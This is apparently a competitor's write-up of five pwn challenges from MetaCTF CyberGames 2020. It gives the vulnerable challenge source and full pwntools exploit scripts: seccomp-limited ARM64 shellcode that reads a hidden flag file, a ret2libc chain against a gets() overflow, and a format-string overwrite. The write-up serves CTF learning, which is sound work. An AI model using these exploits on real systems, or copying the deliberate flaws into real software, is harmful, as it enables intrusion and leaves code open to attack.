---
layout: post
title:  "Writeup MetaCTF CyberGames 2020 "
date:   2020-10-26
categories: ctf
description: Writeup MetaCTF CyberGames 2020 
tags: ctf-writeup
---

<img src="/images/MetaCTF2020/scoreboard.png"/>

25 Oktober 2020, my team CCUG got 19th place out of 1017 participants for the student category and 30th place out of 1587 participants overall category. 


## Pwn
<ul style="line-height: 10px;">
    <li> <a href="#executorarm64">Executor-arm64</a> </li>
    <li> <a href="#Bafflingbuff2">Baffling Buffer 2 </a> </li>
    <li> <a href="#mininghero">mining hero</a> </li>
    <li> <a href="#Bafflingbuff1">Baffling Buffer 1</a> </li>
    <li> <a href="#Bafflingbuff0">Baffling Buffer 0 </a> </li>
</ul>


<h1 id="executorarm64">Executor-arm64</h1>

### Description:
    
    If you've enjoyed the previous executor challenges, this time the executor is 
    back again, running on aarch64! Connect to executor-arm.metaproblems.com 12334 
    to see how well you can shellcode in aarch64 assembly!

    Note: Flag is in standard format, but the flag file name is not flag.txt. 
    It is in the current working directory though.

### Solution:

source code of the binary:

{% highlight C %}
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <seccomp.h>
#include <sys/prctl.h>
#include <fcntl.h>
#include <unistd.h>
#include <signal.h>

#define LENGTH 128

void sandbox(){
	scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
	if (ctx == NULL) {
		printf("seccomp error\n");
		exit(0);
	}

	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(openat), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(getdents64), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit), 0);
	seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);

	if (seccomp_load(ctx) < 0){
		seccomp_release(ctx);
		exit(0);
	}
	seccomp_release(ctx);
}

void handler(int sig) {
	exit(-2);
}

char code[1000];

int main(int argc, char* argv[]){

	setbuf(stdout, 0);
	setbuf(stdin, 0);

	puts("Welcome to the executor! Now powered by Aarch64!");
	puts("Wanna learn/practice how to write ARM64 assembly? This challenge is for you!");
	puts("We have added limits on what syscalls you can use. Good luck!");
	puts("Note: The flag is inside a file that's in the current directory. However, you'll need to find the flag filename first.");
	puts("Enter your code below:");

	signal(SIGALRM, handler);

	alarm(30);

	memset(&code, 0, 1000); 
	read(0, &code, 1000);
	puts("Processing code...");

	sandbox();

	(*(void(*)()) code)();

	return 0;
}
{% endhighlight %}

as you can see this is a shellcode challenge, we can only use a few syscall openat, read, getdents64, write, exit, exit_group. so I plan to get directory entries
inside a directory by using getdents64 and print out the flag file. since the name of the flag will be an uncommon name, so we have to find out manually.
when the program crash, it will reveal a file path. so I'm planning to read that file first.



<img src="/images/MetaCTF2020/executor1.png"/>

this is my assembly script to read `/opt/start/executor-arm.sh`:
{% highlight python %}
from pwn import *
context.arch = "aarch64"
def main():
    r = remote("executor-arm.metaproblems.com",12334)
    p = '''
    // stage 1: reading an known file 
    // fd = openat(0, "/opt/start/executor-arm.sh", O_RDONLY)
    mov  x0, xzr
    mov  x1, #0x6873
    movk x1, #0x00, lsl #16
    str  x1, [sp, #-8]!
    mov  x1, #0x6f74
    movk x1, #0x2d72, lsl #16
    movk x1, #0x7261, lsl #32
    movk x1, #0x2e6d, lsl #48
    str  x1, [sp, #-8]!
    mov  x1, #0x7472
    movk x1, #0x652f, lsl #16
    movk x1, #0x6578, lsl #32
    movk x1, #0x7563, lsl #48
    str  x1, [sp, #-8]!
    mov  x1, #0x6f2f
    movk x1, #0x7470, lsl #16
    movk x1, #0x732f, lsl #32
    movk x1, #0x6174, lsl #48
    str  x1, [sp, #-8]!
    add  x1, sp, x0
    mov  x2, xzr
    mov  x8, #56
    svc  #0x1337

    mvn  x3, x0

    // read(fd, *buf, size)
    mov  x2, #0xfff
    sub  sp, sp, x2
    mov  x8, xzr
    add  x1, sp, x8
    mov  x8, #63
    svc  #0x1337

    // write(1, *buf, size)
    str  x0, [sp, #-8]!
    lsr  x0, x2, #11
    ldr  x2, [sp], #8
    mov  x8, #64
    svc  #0x1337'''
    r.sendline(asm(p))
    r.interactive()

if __name__ == "__main__":
    main()
{% endhighlight %}

<img src="/images/MetaCTF2020/executor2.png"/>

and we got the file. since the description said the flag is inside the current directory so we have to get directory entries of `/home/user/` 
using getdents64.

my script to get directory entries of `/home/user/`:
{% highlight python %}
from pwn import *
context.arch = "aarch64"
def main():
    r = remote("executor-arm.metaproblems.com",12334)
    p = '''
    // stage 2: get all files and directories inside a directory
    // fd = openat(0, "/home/user", O_RDONLY)
    mov  x0, xzr
    mov  x1, #0x7265
    movk x1, #0x2f, lsl #16
    str  x1, [sp, #-8]!
    mov  x1, #0x682f
    movk x1, #0x6d6f, lsl #16
    movk x1, #0x2f65, lsl #32
    movk x1, #0x7375, lsl #48
    str  x1, [sp, #-8]!
    add  x1, sp, x0
    mov  x2, xzr
    mov  x8, #56
    svc  #0x1337

    // getdents64(fd, *buf, size)
    mov  x2, #0xfff
    sub  sp, sp, x2
    mov  x8, xzr
    add  x1, sp, x8
    mov  x8, #61
    svc  #0x1337


    // write(1, *buf, size)
    str  x0, [sp, #-8]!
    lsr  x0, x2, #11
    ldr  x2, [sp], #8
    mov  x8, #64
    svc  #0x1337
    '''
    r.sendline(asm(p))
    r.interactive()

if __name__ == "__main__":
    main()
{% endhighlight %}

and now we got the flag filename


<img src="/images/MetaCTF2020/executor3.png"/>

now we can just read the flag using that name.
{% highlight python %}

from pwn import *
context.arch = "aarch64"
def main():
    r = remote("executor-arm.metaproblems.com",12334)
    p = '''
    // stage 3: reading a secret file inside the directory
    // fd = openat(0, "/home/user/not-a-easily-guessable-flag-file-a489df083c.txt", O_RDONLY)
    mov  x0, xzr
    mov  x1, #0x7478
    movk x1, #0x00, lsl #16
    str  x1, [sp, #-8]!
    movk x1, #0x6664
    movk x1, #0x3830, lsl #16
    movk x1, #0x6333, lsl #32
    movk x1, #0x742e, lsl #48
    str  x1, [sp, #-8]!
    mov  x1, #0x6c69
    movk x1, #0x2d65, lsl #16
    movk x1, #0x3461, lsl #32
    movk x1, #0x3938, lsl #48
    str  x1, [sp, #-8]!
    mov  x1, #0x2d65
    movk x1, #0x6c66, lsl #16
    movk x1, #0x6761, lsl #32
    movk x1, #0x662d, lsl #48
    str  x1, [sp, #-8]!
    mov  x1, #0x7567
    movk x1, #0x7365, lsl #16
    movk x1, #0x6173, lsl #32
    movk x1, #0x6c62, lsl #48
    str  x1, [sp, #-8]!
    mov  x1, #0x652d
    movk x1, #0x7361, lsl #16
    movk x1, #0x6c69, lsl #32
    movk x1, #0x2d79, lsl #48
    str  x1, [sp, #-8]!
    mov  x1, #0x7265
    movk x1, #0x6e2f, lsl #16
    movk x1, #0x746f, lsl #32
    movk x1, #0x612d, lsl #48
    str  x1, [sp, #-8]!
    mov  x1, #0x682f
    movk x1, #0x6d6f, lsl #16
    movk x1, #0x2f65, lsl #32
    movk x1, #0x7375, lsl #48
    str  x1, [sp, #-8]!
    add  x1, sp, x0
    mov  x2, xzr
    mov  x8, #56
    svc  #0x1337

    // read(fd, *buf, size)
    mov  x2, #0xfff
    sub  sp, sp, x2
    mov  x8, xzr
    add  x1, sp, x8
    mov  x8, #63
    svc  #0x1337


    // write(1, *buf, size)
    str  x0, [sp, #-8]!
    lsr  x0, x2, #11
    ldr  x2, [sp], #8
    mov  x8, #64
    svc  #0x1337



    // exit(status)
    mov  x8, #93
    svc  #0x1337
    '''
    r.sendline(asm(p))
    r.interactive()

if __name__ == "__main__":
    main()

{% endhighlight %}

<img src="/images/MetaCTF2020/executorflag.png"/>
FLAG: MetaCTF{M1ght7_sh3llc0d3r5_0f_m4n7_4rch1t3ctur35}

<h1 id="Bafflingbuff2">Baffling Buffer 2</h1>

### Description:

    As an intern, I've been tasked with writing some C code to automate copying 
    files. I decided to base my program on this helpful tutorial that I've found 
    online, and the first release is now running on host1.metaproblems.com 5152. 
    I got some compiler warnings when I compiled my program though, but it 
    shouldn't matter too much, right?

    Given the binary, source code, and libc of the service, can you get RCE on 
    this Debian server to get the flag? You may assume that the normal linux 
    files/directories are present in the remote server.

### Solution:

we were given some files, binary, source code, and the libc.
this is the source code of the binary:

{% highlight c %}
#include <stdio.h>
#include <stdlib.h>
 
int main()
{
   setbuf(stdout, 0);
   setbuf(stdin, 0);
   setbuf(stderr, 0);

   char ch, source_file[20], target_file[20];
   FILE *source, *target;
 
   printf("Enter name of file to copy\n");
   gets(source_file);
 
   source = fopen(source_file, "r");
 
   if( source == NULL )
   {
      printf("Press any key to exit...\n");
      exit(EXIT_FAILURE);
   }
 
   printf("Enter name of target file\n");
   gets(target_file);
 
   target = fopen(target_file, "w");
 
   if( target == NULL )
   {
      fclose(source);
      printf("Press any key to exit...\n");
      exit(EXIT_FAILURE);
   }
 
   while( ( ch = fgetc(source) ) != EOF )
      fputc(ch, target);
 
   printf("File copied successfully.\n");
 
   fclose(source);
   fclose(target);
 
   return 0;
}
{% endhighlight %}

the bug is a buffer overflow, we can control the `%rip` on the first input, but we have to pass the `fopen()`. since the program will exit if the file that we input does not exist. in order to bypass it, we can use `\x00` to terminate the filename. after we control the `%rip`
we can just be doing a ret2libc attack to get a shell.<br/>
this is my exploit:
{% highlight python %}

#!/usr/bin/env python2
import sys
from pwn import *
context.update(arch="amd64", endian="little", os="linux", log_level="debug",
               terminal=["tmux", "split-window", "-v", "-p 85"],)
LOCAL, REMOTE = False, False
TARGET=os.path.realpath("/home/tripoloski/code/ctf/metaCTF/binex/bb2/bb2")
elf = ELF(TARGET)

def attach(r):
    if LOCAL:
        bkps = []
        gdb.attach(r, '\n'.join(["break %s"%(x,) for x in bkps]))
    return

def exploit(r):
    # attach(r)
    main = 0x000000000401192
    puts_got = 0x00000404018
    pop_rdi = 0x000000000040133b
    ret = 0x0000000000401016
    puts_plt = 0x000000000401030
    
    p = "/etc/passwd\x00"
    p += "AAAA"
    p += "A" * 40
    p += p64(pop_rdi)
    p += p64(puts_got)
    p += p64(puts_plt)
    p += p64(main)
    r.sendlineafter("copy\n",p)
    r.sendlineafter("file\n","/tmp/x")
    r.recvuntil("successfully.\n")
    leak = u64(r.recvline().replace('\n',"\x00").ljust(8, "\x00"))
    syste = leak -0x2cf50
    binsh = leak + 0x10fc09
    p = "/etc/passwd\x00"
    p += "AAAA"
    p += "A" * 40
    p += p64(pop_rdi)
    p += p64(binsh)
    p += p64(syste)
    r.sendline(p)
    r.sendline("/tmp/x")
    log.info("leak: " + hex(leak))
    r.interactive()
    return

if __name__ == "__main__":
    if len(sys.argv)==2 and sys.argv[1]=="remote":
        REMOTE = True
        r = remote("host1.metaproblems.com", 5152)
    else:
        LOCAL = True
        r = process([TARGET,])
    exploit(r)
    sys.exit(0)

{% endhighlight %}

<img src="/images/MetaCTF2020/bb2.png"/>

FLAG: MetaCTF{Its_never_a_good_idea_t0_copy_code_onl1n3}

<h1 id="mininghero">mining hero</h1>

### Description:

    I just finished making this super cool game!! You get to go mining, and as you 
    mine, you earn money. Then you can use that money to mine faster (or if you're 
    feeling lucky, you can place a bet)! Once you've amassed enough wealth, you 
    can demand that God give you a shoutout. And if God is feeling friendly, he 
    might even give you a flag! Try it out here: nc host1.metaproblems.com 5950!

    Here's the source and the binary.

    Hint: Not all overflows happen in a buffer.

### Solution:

we were given the binary and source code file for this challenge.<br/>

source code:<br/>
{% highlight C++ %}
#include <iostream>
#include <map>
#include <string>
#include <fstream>
#include <streambuf>

#include <time.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

// Amount of money the player has
unsigned long long player_funds = 150;

// Time for one tick of mining. Ten per operation
unsigned int tool_time = 500000;

// Mining profit per operation
unsigned int mining_profit = 10;

// The number of replacements the player has
unsigned int tools_left = 0;

// Mining operations before player is no longer encouraged
unsigned int encouragement = 0;

std::string name;

void place_bet(){
	if(player_funds == 0){
		std::cout << "You don't have enough money for this!" << std::endl;
		return;
	}
	std::cout << "A coin will be flipped. Before the coin is flipped, you may pick heads or tails. "
		<< "If you guess correctly, any money you bet will be doubled. Otherwise, the money will"
		<< " be forfeit. Enter heads, tails, or cancel" << std::endl;
	std::string input;
	std::cin >> input;
	if(input == "heads" || input == "tails"){
		unsigned long long bet{ 0 };
		
		do {
			std::cout << "How much would you like to bet that the coin will come up " << input << "?"
				<< " Enter a number between 1 and " << player_funds << "." << std::endl;
			std::cin >> bet;
		} while(!std::cin.good() || bet > player_funds);

		player_funds -= bet;

		srand(time(nullptr));
		auto val{ rand() % 2 };
		if(val){
			std::cout << "... and the coin came up " << input << "!! You just got $" << bet
			       <<"! Congratulations! Your balance is $" << (player_funds += bet * 2) << std::endl;
		} else {
			std::cout << "... and the coin came up " << (input == "heads" ? "tails" : "heads") 
				<< ". You lost $" << bet << ". Your balance is $" << player_funds << std::endl;
		}
	} else {
		std::cout << "Cancelling bet" << std::endl;
	}
}

void tool_break(){
	std::cout << "Oh no! Your tool broke!";
	if(tools_left == 0){
		std::cout << " You don't have any replacements available. It's back to mining with your hands" << std::endl;
		mining_profit = 10;
	} else {
		std::cout << " You used a replacement. You now have " << --tools_left << " replacements available " << std::endl;
	}
}

void work(){
	std::cout << "You go to work in the mines" << std::endl;
	std::cout << "[..........]" << std::endl;
	for(unsigned int i = 0; i < 10; i++){
		usleep(tool_time);
		std::cout << "[";
		for(unsigned int j = 0; j <= i; j++){
			std::cout << "=";
		}
		for(unsigned int j = i + 1; j < 10; j++){
			std::cout << ".";
		}
		std::cout << "]" << std::endl;
	}

	srand(time(NULL));
	
	if(rand() % 100 == 0){
		auto profit{ mining_profit * 9 + rand() % (2 * mining_profit) };
		std::cout << "You struck gold! You earned $" << profit << ". Your balance is now $"
		       << (player_funds += profit) << ". " << std::endl;
	} else {
		auto profit{ 1 + rand() % (2 * mining_profit) };
		std::cout << "It was a normal days work. You earned $" << profit << ". Your balance is now $"
			<< (player_funds += profit) << ". " << std::endl;
	}

	if(rand() % 3 == 0 && mining_profit != 10){
		tool_break();
	}

	if(encouragement){
		encouragement--;
		if(encouragement == 0){
			std::cout << "You aren't encouraged to mine faster anymore" << std::endl;
			tool_time = 500000;
		}
	}
}

void purchase(){
	std::map<std::string, unsigned long long> prices{
		{ "tool", 100 },
		{ "encouragement", 20 },
		{ "shout-out-from-literally-god", 1000000000000000ULL }
	};

	std::string option{};
	do {
		std::cout << "What would you like to buy? Options are ";
		for(auto& entry : prices){
			std::cout << entry.first << " (cost: " << entry.second << "), ";
		}
		std::cout << "or cancel" << std::endl;
		std::cin >> option;
		if(option == "cancel"){
			return;
		}
	} while(prices.find(option) == prices.end());

	unsigned long long count{ 0 };
	do {
		std::cout << "How many would you like to buy? Must be greater than 0" << std::endl;
		std::cin >> count;
	} while(!std::cin.good() || !count);

	auto item_cost{ prices.at(option) };
	auto total{ item_cost * count };
	if(total > player_funds) {
		std::cout << "You don't have the money for that!" << std::endl;
		return;
	}

	player_funds -= total;
	if(option == "tool"){
		std::cout << "You bought " << count << " tool" << ((count - 1) ? "s" : "") << ". You " 
			<< "now have " << (tools_left += count - 1) << " spare tool" 
			<< (tools_left - 1 ? "s" : "") << std::endl;
		mining_profit = 50;
	} else if(option == "encouragement"){
		for(unsigned long long i = 0; i < count; i++){
			std::cout << "You can do it! Go you!" << std::endl;
			encouragement++;
		}
		std::cout << "You are now very encouraged! Your mining speed has increased." << std::endl;
		tool_time = 50000;
	} else if(option == "shout-out-from-literally-god"){
		bool god_is_happy = rand() & 0xFFFFFF == 0;
		bool* god_is_really_happy = &god_is_happy;
		printf("Hmmmm\n");
		printf(name.c_str());
		printf("\nYou have done well!\n");
		printf("Good job!\n");
		
		if(*god_is_really_happy){
			printf("I'm feeling generous right now!\nHave a flag!\n");
			std::ifstream t("flag.txt");
			std::string str((std::istreambuf_iterator<char>(t)),
				                 std::istreambuf_iterator<char>());
			std::cout << str << std::endl;
		}

		printf("Sincerely,\n");
		printf("\t~God\n");
	}
}

int main(int argc, char** argv){
	std::cout << "Welcome to this very in-depth game. The goal is to amass wealth and earn the god's favor." << std::endl;
	std::cout << "Before we continue, what is your name?" << std::endl;
	std::cin >> name;

	do {
		std::cout << "Current funds: $" << player_funds << std::endl;
		std::cout << "Your options are: " << std::endl;
		std::cout << "1: Place a bet on a coin flip for a chance to double your money" << std::endl;
		std::cout << "2: Go mining to earn some money" << std::endl;
		std::cout << "3: Buy things" << std::endl;
		std::cout << "4: Quit (Your money will not be saved)" << std::endl;
		std::cout << "Please enter a number 1-4 to continue..." << std::endl;
		std::string input{};
		std::cin >> input;
		if(input == "1"){
			place_bet();
		} else if(input == "2"){
			work();
		} else if(input == "3"){
			purchase();
		} else if(input == "4"){
			return 0;
		} else {
			std::cout << "Invalid input" << std::endl;
		}
	} while(true);
}
{% endhighlight %}
it's written in C++, there is a format string bug on the name variable when we bought `shout-out-from-literally-god` 
and integer overflow on `place_bet` function.<br/>
to solve this challenge we can just bet till we got a lot of money to buy `shout-out-from-literally-god`, 
after that, we use format string bug to overwrite `god_is_really_happy` <br/>

my exploit:
{% highlight python %}
from pwn import *
from ctypes import *
import subprocess

context.arch = "amd64"
context.os = "linux"
r = remote("host1.metaproblems.com",5950)
# r = process("./text-game")
context.update(arch="amd64", endian="little", os="linux", log_level="info",
               terminal=["tmux", "split-window", "-v", "-p 85"],)
LOCAL = True

def attach(r):
    if LOCAL:
        bkps = ["* 0x3521"]
        gdb.attach(r, '\n'.join(["pie break %s"%(x,) for x in bkps]))
    return

def init(d):
    r.sendlineafter("name?\n",d)

def betting(n):
    r.sendlineafter("continue...\n","1")
    r.sendlineafter("cancel\n","heads")
    r.recvuntil("1 and ")
    my_okane = r.recvline().replace(".","")
    log.info("okane: " + my_okane)
    r.sendline(n)
    return my_okane
    
def main():
    # attach(r)
    # init("AAAAAAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p")
    init("%{}c%12$hn".format((0x0000) & 0xffff))
    current_okane = 0

    okane = 150
    for i in range(50):
        r.sendline('1')
        r.sendline("heads")
        r.sendline(str(okane))
        okane *= 2
    r.sendline("3")
    r.sendline("shout-out-from-literally-god")
    r.sendline("1")
    r.interactive()

    
if __name__ == "__main__":
    main()
{% endhighlight %}

<img src="/images/MetaCTF2020/minig-hero.png"/>

FLAG: MetaCTF{i_W0N_w!thOUt_CHEat!nG!!}

<h1 id="Bafflingbuff1">Baffling Buffer 1</h1>

### Description: 

    After pointing out the initial issue, the developers issued a new update on 
    the login service and restarted it at host1.metaproblems.com 5151. Looking at 
    the binary and source code, you discovered that this code is still vulnerable.

### Solution:

this is just a simple buffer overflow. use `Sup3rs3cr3tC0de\x00` as your first payload
and overflow with 40 junk and then call the `win` function to get the flag

{% highlight python %}
#!/usr/bin/env python2
import sys
from pwn import *
context.update(arch="amd64", endian="little", os="linux", log_level="debug",
               terminal=["tmux", "split-window", "-v", "-p 85"],)
LOCAL, REMOTE = False, False
TARGET=os.path.realpath("/home/tripoloski/code/ctf/metaCTF/binex/bb1/bb1")
elf = ELF(TARGET)

def attach(r):
    if LOCAL:
        bkps = []
        gdb.attach(r, '\n'.join(["break %s"%(x,) for x in bkps]))
    return

def exploit(r):
    attach(r)
    p = "Sup3rs3cr3tC0de\x00"
    p += "A" * 40
    p += p64(elf.sym['win'])
    r.sendline(p)
    r.interactive()
    return

if __name__ == "__main__":
    if len(sys.argv)==2 and sys.argv[1]=="remote":
        REMOTE = True
        r = remote("host1.metaproblems.com", 5151)
    else:
        LOCAL = True
        r = process([TARGET,])
    exploit(r)
    sys.exit(0)

{% endhighlight %}

FLAG: MetaCTF{c_strings_are_the_best_strings}

<h1 id="Bafflingbuff0">Baffling Buffer 0</h1>

### Description:

    While hunting for vulnerabilities in client infrastructure, you discover a 
    strange service located at host1.metaproblems.com 5150. You've uncovered the 
    binary and source code code of the remote service, which looks somewhat 
    unfinished. The code is written in a very exploitable manner. Can you find 
    out how to make the program give you the flag?

### Solution:

a simple buffer overflow. just input a lot of string and the flag will appear

FLAG: MetaCTF{just_a_little_auth_bypass}